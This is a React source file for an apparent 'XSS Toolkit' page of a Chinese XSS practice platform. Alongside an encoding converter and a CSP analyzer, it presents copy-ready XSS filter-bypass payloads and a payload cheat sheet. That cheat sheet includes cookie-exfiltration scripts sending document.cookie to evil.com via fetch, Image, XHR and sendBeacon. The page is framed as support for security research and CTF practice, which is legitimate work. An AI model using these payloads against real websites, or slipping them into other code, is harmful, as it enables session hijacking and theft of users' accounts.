import { useState } from "react";
import { Link } from "wouter";
import { motion, AnimatePresence } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { toast } from "sonner";
import { Copy, Code2, Shield, Zap, FlaskConical, ArrowRight, ChevronRight, Terminal, Lock, AlertTriangle, Info, CheckCircle2, XCircle } from "lucide-react";

function copyToClipboard(text: string) {
  navigator.clipboard.writeText(text).then(() => toast.success("已复制到剪贴板"));
}

// ─── Encoding Tools ──────────────────────────────────────────────────────────

function EncodingTool() {
  const [input, setInput] = useState("");
  const [mode, setMode] = useState<"html" | "url" | "base64" | "unicode" | "hex">("html");
  const [decodeResult, setDecodeResult] = useState("");

  const encode = () => {
    if (!input) return "";
    switch (mode) {
      case "html":
        return input.replace(/[&<>"'`]/g, (c) => ({
          "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#x27;", "`": "&#x60;",
        }[c] || c));
      case "url":
        return encodeURIComponent(input);
      case "base64":
        try { return btoa(unescape(encodeURIComponent(input))); } catch { return "编码失败"; }
      case "unicode":
        return Array.from(input).map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, "0")}`).join("");
      case "hex":
        return Array.from(input).map(c => `\\x${c.charCodeAt(0).toString(16).padStart(2, "0")}`).join("");
      default:
        return input;
    }
  };

  const decode = () => {
    if (!input) return "";
    try {
      switch (mode) {
        case "html": {
          const el = document.createElement("div");
          el.innerHTML = input;
          return el.textContent || "";
        }
        case "url":
          return decodeURIComponent(input);
        case "base64":
          return decodeURIComponent(escape(atob(input)));
        case "unicode":
          return input.replace(/\\u([0-9a-fA-F]{4})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16)));
        case "hex":
          return input.replace(/\\x([0-9a-fA-F]{2})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16)));
        default:
          return input;
      }
    } catch {
      return "解码失败";
    }
  };

  const encoded = encode();
  const modeLabels = { html: "HTML 实体", url: "URL 编码", base64: "Base64", unicode: "Unicode", hex: "Hex" };

  return (
    <div className="bg-card border border-border rounded-2xl p-6 h-full">
      <div className="flex items-center gap-2.5 mb-5">
        <div className="w-8 h-8 rounded-lg bg-primary/10 flex items-center justify-center">
          <Code2 className="w-4 h-4 text-primary" />
        </div>
        <div>
          <h3 className="font-semibold text-foreground text-sm">编码转换工具</h3>
          <p className="text-xs text-muted-foreground">支持 HTML 实体、URL、Base64、Unicode、Hex</p>
        </div>
      </div>

      {/* Mode tabs */}
      <div className="flex flex-wrap gap-1.5 mb-4 p-1 bg-foreground/[0.04] rounded-xl">
        {(["html", "url", "base64", "unicode", "hex"] as const).map((m) => (
          <button
            key={m}
            onClick={() => setMode(m)}
            className={`px-3 py-1.5 text-xs rounded-lg font-medium transition-all duration-200 ${
              mode === m
                ? "bg-primary text-primary-foreground shadow-sm"
                : "text-muted-foreground hover:text-foreground hover:bg-foreground/5"
            }`}
          >
            {modeLabels[m]}
          </button>
        ))}
      </div>

      <div className="space-y-3">
        <div>
          <label className="text-xs text-muted-foreground mb-1.5 block font-medium">输入内容</label>
          <Textarea
            value={input}
            onChange={(e) => setInput(e.target.value)}
            placeholder="输入要编码/解码的内容..."
            className="font-mono text-sm resize-none h-20 bg-foreground/[0.02]"
          />
        </div>

        <div>
          <div className="flex items-center justify-between mb-1.5">
            <label className="text-xs text-muted-foreground font-medium">编码结果</label>
            {encoded && (
              <button
                onClick={() => copyToClipboard(encoded)}
                className="text-xs text-primary hover:text-primary/80 flex items-center gap-1 transition-colors"
              >
                <Copy className="w-3 h-3" /> 复制
              </button>
            )}
          </div>
          <div className="bg-foreground/[0.03] rounded-xl p-3 font-mono text-xs text-foreground/80 min-h-[60px] break-all border border-border/60">
            {encoded || <span className="text-muted-foreground/60 italic">编码结果将显示在这里</span>}
          </div>
        </div>

        {decodeResult && (
          <motion.div
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: "auto" }}
            className="bg-primary/5 border border-primary/20 rounded-xl p-3"
          >
            <div className="flex items-center justify-between mb-1">
              <span className="text-xs text-primary font-medium">解码结果</span>
              <button onClick={() => setDecodeResult("")} className="text-xs text-muted-foreground hover:text-foreground">✕</button>
            </div>
            <code className="text-xs font-mono text-foreground/80 break-all">{decodeResult}</code>
          </motion.div>
        )}

        <div className="flex gap-2 pt-1">
          <Button
            size="sm" variant="outline"
            onClick={() => { if (encoded) setInput(encoded); }}
            className="text-xs flex-1"
          >
            <ArrowRight className="w-3 h-3 mr-1" />
            结果作为输入
          </Button>
          <Button
            size="sm" variant="outline"
            onClick={() => {
              const d = decode();
              if (d) setDecodeResult(d);
            }}
            className="text-xs flex-1"
          >
            <ChevronRight className="w-3 h-3 mr-1" />
            解码输入
          </Button>
        </div>
      </div>
    </div>
  );
}

// ─── CSP Analyzer ────────────────────────────────────────────────────────────

function CspAnalyzer() {
  const [csp, setCsp] = useState("");

  const analyze = () => {
    if (!csp.trim()) return null;
    const directives = csp.split(";").map(d => d.trim()).filter(Boolean);
    const issues: { level: "danger" | "warn" | "info" | "ok"; msg: string }[] = [];

    const hasUnsafeInline = csp.includes("'unsafe-inline'");
    const hasUnsafeEval = csp.includes("'unsafe-eval'");
    const hasWildcard = /script-src[^;]*\*/.test(csp);
    const hasNonce = csp.includes("'nonce-");
    const hasHash = csp.includes("'sha");
    const hasStrictDynamic = csp.includes("'strict-dynamic'");
    const noScriptSrc = !csp.includes("script-src");
    const hasDataUri = csp.includes("data:");
    const hasObjectSrc = csp.includes("object-src");
    const hasBaseUri = csp.includes("base-uri");

    if (hasUnsafeInline && !hasNonce && !hasHash) issues.push({ level: "danger", msg: "'unsafe-inline' 允许内联脚本执行，XSS 风险极高" });
    if (hasUnsafeEval) issues.push({ level: "danger", msg: "'unsafe-eval' 允许 eval() 执行，可被利用进行代码注入" });
    if (hasWildcard) issues.push({ level: "danger", msg: "script-src 包含通配符 *，可从任意域加载脚本" });
    if (noScriptSrc) issues.push({ level: "warn", msg: "未设置 script-src，将回退到 default-src，建议显式声明" });
    if (hasDataUri) issues.push({ level: "warn", msg: "允许 data: URI，可能被用于加载恶意内容" });
    if (!hasObjectSrc) issues.push({ level: "warn", msg: "未设置 object-src，建议设为 'none' 以防止 Flash/插件攻击" });
    if (!hasBaseUri) issues.push({ level: "warn", msg: "未设置 base-uri，建议设为 'none' 或 'self' 防止 base 标签注入" });
    if (hasNonce) issues.push({ level: "ok", msg: "使用了 nonce，确保每次请求 nonce 唯一且不可预测" });
    if (hasHash) issues.push({ level: "ok", msg: "使用了 hash，注意脚本内容变化后需更新 hash 值" });
    if (hasStrictDynamic) issues.push({ level: "ok", msg: "'strict-dynamic' 可简化 CSP 管理，推荐配合 nonce 使用" });

    return { directives, issues };
  };

  const result = analyze();

  const levelConfig = {
    danger: { icon: XCircle, bg: "bg-red-50 border-red-200", text: "text-red-700", label: "危险" },
    warn: { icon: AlertTriangle, bg: "bg-amber-50 border-amber-200", text: "text-amber-700", label: "警告" },
    info: { icon: Info, bg: "bg-blue-50 border-blue-200", text: "text-blue-700", label: "提示" },
    ok: { icon: CheckCircle2, bg: "bg-green-50 border-green-200", text: "text-green-700", label: "良好" },
  };

  return (
    <div className="bg-card border border-border rounded-2xl p-6 h-full">
      <div className="flex items-center gap-2.5 mb-5">
        <div className="w-8 h-8 rounded-lg bg-primary/10 flex items-center justify-center">
          <Shield className="w-4 h-4 text-primary" />
        </div>
        <div>
          <h3 className="font-semibold text-foreground text-sm">CSP 分析器</h3>
          <p className="text-xs text-muted-foreground">检测 Content-Security-Policy 配置安全性</p>
        </div>
      </div>

      <Textarea
        value={csp}
        onChange={(e) => setCsp(e.target.value)}
        placeholder={"粘贴 CSP 头内容，例如：\ndefault-src 'self'; script-src 'unsafe-inline' https://cdn.example.com; object-src 'none'"}
        className="font-mono text-xs resize-none h-24 mb-4 bg-foreground/[0.02]"
      />

      <AnimatePresence mode="wait">
        {result ? (
          <motion.div
            key="result"
            initial={{ opacity: 0, y: 8 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -8 }}
            className="space-y-2"
          >
            <div className="flex items-center justify-between mb-3">
              <span className="text-xs text-muted-foreground font-medium">分析结果 · {result.directives.length} 条指令</span>
              <div className="flex gap-1">
                {(["danger", "warn", "ok"] as const).map(level => {
                  const count = result.issues.filter(i => i.level === level).length;
                  if (!count) return null;
                  const cfg = levelConfig[level];
                  return (
                    <span key={level} className={`text-[10px] px-2 py-0.5 rounded-full border font-medium ${cfg.bg} ${cfg.text}`}>
                      {count} {cfg.label}
                    </span>
                  );
                })}
              </div>
            </div>
            {result.issues.map((issue, i) => {
              const cfg = levelConfig[issue.level];
              return (
                <div key={i} className={`flex items-start gap-2.5 text-xs px-3 py-2.5 rounded-xl border ${cfg.bg} ${cfg.text}`}>
                  <cfg.icon className="w-3.5 h-3.5 shrink-0 mt-0.5" />
                  <span className="leading-relaxed">{issue.msg}</span>
                </div>
              );
            })}
          </motion.div>
        ) : (
          <motion.div
            key="empty"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="flex flex-col items-center justify-center py-8 text-center"
          >
            <Shield className="w-8 h-8 text-muted-foreground/30 mb-2" />
            <p className="text-xs text-muted-foreground/60">粘贴 CSP 头内容后自动分析</p>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

// ─── Bypass Techniques ───────────────────────────────────────────────────────

const bypassTechniques = [
  {
    category: "标签绕过",
    items: [
      { label: "大小写混合", code: `<ScRiPt>alert(1)</ScRiPt>` },
      { label: "标签截断", code: `<scr<script>ipt>alert(1)</scr</script>ipt>` },
      { label: "空字节", code: `<scr\x00ipt>alert(1)</scr\x00ipt>` },
      { label: "HTML5 新标签", code: `<details open ontoggle=alert(1)>` },
      { label: "video 标签", code: `<video src=x onerror=alert(1)>` },
      { label: "audio 标签", code: `<audio src=x onerror=alert(1)>` },
      { label: "body onload", code: `<body onload=alert(1)>` },
      { label: "input autofocus", code: `<input autofocus onfocus=alert(1)>` },
    ],
  },
  {
    category: "属性绕过",
    items: [
      { label: "无引号", code: `<img src=x onerror=alert(1)>` },
      { label: "单引号", code: `<img src='x' onerror='alert(1)'>` },
      { label: "反引号", code: "<img src=`x` onerror=`alert(1)`>" },
      { label: "换行符", code: `<img src=x\nonerror=alert(1)>` },
      { label: "Tab 分隔", code: `<img src=x\tonerror=alert(1)>` },
      { label: "斜杠分隔", code: `<img/src=x/onerror=alert(1)>` },
    ],
  },
  {
    category: "JS 绕过",
    items: [
      { label: "String.fromCharCode", code: `eval(String.fromCharCode(97,108,101,114,116,40,49,41))` },
      { label: "atob 解码", code: `eval(atob('YWxlcnQoMSk='))` },
      { label: "模板字符串", code: "setTimeout`alert\x281\x29`" },
      { label: "构造函数", code: `[].constructor.constructor('alert(1)')()` },
      { label: "window 属性", code: `window['al'+'ert'](1)` },
      { label: "location 跳转", code: `location='javascript:alert(1)'` },
      { label: "top 对象", code: `top['al'+'ert'](1)` },
      { label: "Function 构造", code: `Function('alert(1)')()` },
    ],
  },
  {
    category: "过滤绕过",
    items: [
      { label: "HTML 实体", code: `<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">` },
      { label: "URL 编码", code: `<a href="javascript:%61lert(1)">click</a>` },
      { label: "双重编码", code: `%253Cscript%253Ealert(1)%253C/script%253E` },
      { label: "Unicode 转义", code: `<script>\\u0061lert(1)</script>` },
      { label: "注释截断", code: `</script><script>alert(1)//` },
      { label: "SVG 命名空间", code: `<svg><script>alert(1)</script></svg>` },
    ],
  },
];

function BypassTechniques() {
  const [activeCategory, setActiveCategory] = useState(bypassTechniques[0].category);
  const current = bypassTechniques.find(b => b.category === activeCategory)!;

  return (
    <div className="bg-card border border-border rounded-2xl p-6">
      <div className="flex items-center gap-2.5 mb-5">
        <div className="w-8 h-8 rounded-lg bg-primary/10 flex items-center justify-center">
          <Zap className="w-4 h-4 text-primary" />
        </div>
        <div>
          <h3 className="font-semibold text-foreground text-sm">XSS Bypass 技巧速查</h3>
          <p className="text-xs text-muted-foreground">常见过滤器绕过手法，悬停后可一键复制</p>
        </div>
      </div>

      <div className="flex flex-wrap gap-1.5 mb-5 p-1 bg-foreground/[0.04] rounded-xl w-fit">
        {bypassTechniques.map((b) => (
          <button
            key={b.category}
            onClick={() => setActiveCategory(b.category)}
            className={`px-3 py-1.5 text-xs rounded-lg font-medium transition-all duration-200 ${
              activeCategory === b.category
                ? "bg-primary text-primary-foreground shadow-sm"
                : "text-muted-foreground hover:text-foreground hover:bg-foreground/5"
            }`}
          >
            {b.category}
          </button>
        ))}
      </div>

      <AnimatePresence mode="wait">
        <motion.div
          key={activeCategory}
          initial={{ opacity: 0, y: 6 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: -6 }}
          transition={{ duration: 0.2 }}
          className="grid sm:grid-cols-2 gap-2"
        >
          {current.items.map((item) => (
            <div
              key={item.label}
              className="flex items-center gap-3 bg-foreground/[0.03] hover:bg-foreground/[0.06] rounded-xl px-3.5 py-2.5 border border-border/60 hover:border-primary/25 group transition-all duration-200 cursor-default"
            >
              <span className="text-xs text-primary font-medium w-24 shrink-0">{item.label}</span>
              <code className="text-xs font-mono text-foreground/65 flex-1 truncate">{item.code}</code>
              <button
                onClick={() => copyToClipboard(item.code)}
                className="opacity-0 group-hover:opacity-100 transition-opacity text-muted-foreground hover:text-primary shrink-0 p-1 rounded-md hover:bg-primary/10"
              >
                <Copy className="w-3 h-3" />
              </button>
            </div>
          ))}
        </motion.div>
      </AnimatePresence>
    </div>
  );
}

// ─── Payload Cheatsheet ───────────────────────────────────────────────────────

const payloadGroups = [
  {
    category: "弹窗测试",
    items: [
      { label: "alert", code: `<script>alert(1)</script>` },
      { label: "confirm", code: `<script>confirm(1)</script>` },
      { label: "prompt", code: `<script>prompt(1)</script>` },
      { label: "console.log", code: `<script>console.log(document.cookie)</script>` },
    ],
  },
  {
    category: "数据外带",
    items: [
      { label: "fetch 外带", code: `<script>fetch('//evil.com?c='+document.cookie)</script>` },
      { label: "Image 外带", code: `<script>new Image().src='//evil.com?c='+document.cookie</script>` },
      { label: "XHR 外带", code: `<script>var x=new XMLHttpRequest();x.open('GET','//evil.com?c='+document.cookie);x.send()</script>` },
      { label: "Beacon 外带", code: `<script>navigator.sendBeacon('//evil.com',document.cookie)</script>` },
    ],
  },
  {
    category: "注入场景",
    items: [
      { label: "DOM XSS", code: `javascript:alert(document.domain)` },
      { label: "存储型测试", code: `"><script>alert(document.domain)</script>` },
      { label: "属性注入", code: `" onmouseover="alert(1)` },
      { label: "href 注入", code: `javascript:void(alert(1))` },
    ],
  },
];

function PayloadCheatsheet() {
  const [activeGroup, setActiveGroup] = useState(payloadGroups[0].category);
  const current = payloadGroups.find(g => g.category === activeGroup)!;

  return (
    <div className="bg-card border border-border rounded-2xl p-6">
      <div className="flex items-center gap-2.5 mb-5">
        <div className="w-8 h-8 rounded-lg bg-primary/10 flex items-center justify-center">
          <Terminal className="w-4 h-4 text-primary" />
        </div>
        <div>
          <h3 className="font-semibold text-foreground text-sm">常用 XSS Payload 速查</h3>
          <p className="text-xs text-muted-foreground">按场景分类，一键复制使用</p>
        </div>
      </div>

      <div className="flex flex-wrap gap-1.5 mb-5 p-1 bg-foreground/[0.04] rounded-xl w-fit">
        {payloadGroups.map((g) => (
          <button
            key={g.category}
            onClick={() => setActiveGroup(g.category)}
            className={`px-3 py-1.5 text-xs rounded-lg font-medium transition-all duration-200 ${
              activeGroup === g.category
                ? "bg-primary text-primary-foreground shadow-sm"
                : "text-muted-foreground hover:text-foreground hover:bg-foreground/5"
            }`}
          >
            {g.category}
          </button>
        ))}
      </div>

      <AnimatePresence mode="wait">
        <motion.div
          key={activeGroup}
          initial={{ opacity: 0, y: 6 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: -6 }}
          transition={{ duration: 0.2 }}
          className="space-y-2"
        >
          {current.items.map((item) => (
            <div
              key={item.label}
              className="flex items-center gap-3 bg-foreground/[0.03] hover:bg-foreground/[0.06] rounded-xl px-3.5 py-3 border border-border/60 hover:border-primary/25 group transition-all duration-200 cursor-default"
            >
              <span className="text-xs text-primary font-semibold w-24 shrink-0">{item.label}</span>
              <code className="text-xs font-mono text-foreground/65 flex-1 truncate">{item.code}</code>
              <button
                onClick={() => copyToClipboard(item.code)}
                className="opacity-0 group-hover:opacity-100 transition-opacity text-muted-foreground hover:text-primary shrink-0 p-1 rounded-md hover:bg-primary/10"
              >
                <Copy className="w-3.5 h-3.5" />
              </button>
            </div>
          ))}
        </motion.div>
      </AnimatePresence>
    </div>
  );
}

// ─── Main Page ────────────────────────────────────────────────────────────────

export default function Tools() {
  return (
    <div className="min-h-screen bg-background text-foreground">
      {/* Nav */}
      <nav className="sticky top-0 z-50 bg-background/92 backdrop-blur-md border-b border-border/60">
        <div className="container flex items-center justify-between h-14">
          <Link href="/">
            <span className="font-serif text-lg font-bold tracking-tight cursor-pointer hover:opacity-80 transition-opacity">
              XSS<span className="text-primary">.</span>Platform
            </span>
          </Link>
          <div className="flex items-center gap-1">
            <Link href="/">
              <Button variant="ghost" size="sm" className="text-sm text-muted-foreground hover:text-foreground hidden sm:flex">首页</Button>
            </Link>
            <Link href="/labs">
              <Button variant="ghost" size="sm" className="text-sm text-muted-foreground hover:text-foreground gap-1.5">
                <FlaskConical className="w-3.5 h-3.5" />
                <span className="hidden sm:inline">XSS Labs</span>
              </Button>
            </Link>
            <Link href="/dashboard">
              <Button size="sm" className="bg-primary text-primary-foreground hover:bg-primary/90 text-sm ml-1">
                控制台
              </Button>
            </Link>
          </div>
        </div>
      </nav>

      <div className="container py-12">
        {/* Header */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, ease: "easeOut" as const }}
          className="mb-10"
        >
          <p className="text-xs text-primary font-medium tracking-widest uppercase mb-2">安全工具</p>
          <h1 className="font-serif text-5xl md:text-6xl font-bold text-foreground mb-3">
            XSS Toolkit.
          </h1>
          <p className="text-muted-foreground max-w-xl leading-relaxed">
            常用 XSS 工具集合：编码转换、Bypass 技巧速查、CSP 安全分析，助力安全研究与 CTF 竞赛。
          </p>
        </motion.div>

        {/* Tool cards */}
        <motion.div
          initial={{ opacity: 0, y: 16 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.1, ease: "easeOut" as const }}
          className="space-y-5"
        >
          {/* Row 1: Encoding + CSP */}
          <div className="grid lg:grid-cols-2 gap-5">
            <EncodingTool />
            <CspAnalyzer />
          </div>

          {/* Row 2: Bypass full width */}
          <BypassTechniques />

          {/* Row 3: Payload cheatsheet full width */}
          <PayloadCheatsheet />
        </motion.div>

        {/* Footer tip */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.4 }}
          className="mt-8 flex items-center gap-2 text-xs text-muted-foreground/60 border-t border-border/40 pt-6"
        >
          <Lock className="w-3.5 h-3.5" />
          <span>所有操作均在本地完成，无任何数据上传至服务器</span>
        </motion.div>
      </div>
    </div>
  );
}
